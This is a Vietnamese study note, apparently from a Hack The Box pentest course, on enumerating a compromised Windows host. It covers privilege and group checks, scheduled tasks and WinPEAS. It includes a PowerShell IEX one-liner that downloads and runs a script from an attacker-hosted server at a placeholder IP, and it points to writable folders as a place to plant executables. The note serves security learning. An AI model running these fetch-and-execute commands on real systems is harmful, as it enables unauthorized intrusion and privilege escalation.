---
sources: ["raw/Hack The Box/Pentest in a Nutshell/Windows Target - Windows System Enumeration.md"]
tags: ["security", "pentest", "windows", "post-exploitation", "enumeration", "winpeas"]
---

# Liệt kê hệ thống Windows (Windows System Enumeration)

Sau khi có [[my_knowlegde/concepts/windows-initial-access|truy cập ban đầu]], bước tiếp theo là tìm hiểu sâu về cấu trúc bên trong của máy chủ Windows để chuẩn bị cho việc leo thang đặc quyền.

## 1. Kiểm tra quyền hạn và Nhóm người dùng

Xác định danh tính và khả năng của tài khoản hiện tại.

*   **Lệnh kiểm tra quyền**: `whoami /priv`
    *   `SeImpersonatePrivilege`: Một quyền rất quan trọng, cho phép giả mạo danh tính người dùng khác sau khi xác thực, thường dẫn đến leo thang đặc quyền.
*   **Lệnh kiểm tra nhóm**: `whoami /groups`
    *   Xác định xem người dùng có thuộc các nhóm đặc biệt như `Remote Desktop Users` hay `Event Log Readers` không.

## 2. Thu thập thông tin hệ thống

Thông thường, lệnh `systeminfo` hoặc `wmic qfe` (kiểm tra bản vá) sẽ bị từ chối nếu là người dùng thường. Do đó, cần sử dụng các công cụ khác.

*   **Thông tin cần biết**: Phiên bản hệ điều hành cụ thể (build number), dung lượng RAM, thời gian cài đặt và các hotfix đã cài.

## 3. Kiểm tra các tác vụ lập lịch (Scheduled Tasks)

Quản trị viên thường đặt lịch chạy các script để tự động hóa công việc. Nếu các script này chạy với quyền cao nhưng người dùng thường có thể sửa đổi, đó là một lỗ hổng nghiêm trọng.

*   **Lệnh**: `schtasks /query /fo LIST /v`
*   **Phát hiện quan trọng**: Tìm thấy tác vụ `CorpBackupAgent` chạy script `backupprep.ps1` dưới quyền **Administrator** mỗi 2 phút.

## 4. Công cụ tự động: WinPEAS

**WinPEAS** (Windows Privilege Escalation Awesome Script) giúp quét toàn bộ hệ thống để tìm đường leo thang.

*   **Cách sử dụng**:
    1.  Tải `winpeas.ps1` về máy tấn công.
    2.  Chạy HTTP server trên máy tấn công: `python3 -m http.server 8080`.
    3.  Tải và thực thi trên máy mục tiêu: `powershell "IEX(New-Object Net.WebClient).downloadString('http://<IP>:8080/winPEAS.ps1')" > winpeas.txt`.
*   **Phát hiện từ WinPEAS**: Thư mục `C:\ProgramData` có quyền **Write** cho nhóm `Users`. Đây là cấu hình sai cho phép ta ghi đè hoặc tạo các tệp tin thực thi độc hại.

## Liên kết liên quan
- [[my_knowlegde/concepts/windows-vulnerability-assessment|Đánh giá lỗ hổng (Windows)]]
- [[my_knowlegde/concepts/windows-privilege-escalation|Leo thang đặc quyền (Windows)]]
- [[my_knowlegde/concepts/linux-system-enumeration|Liệt kê hệ thống (Linux)]]
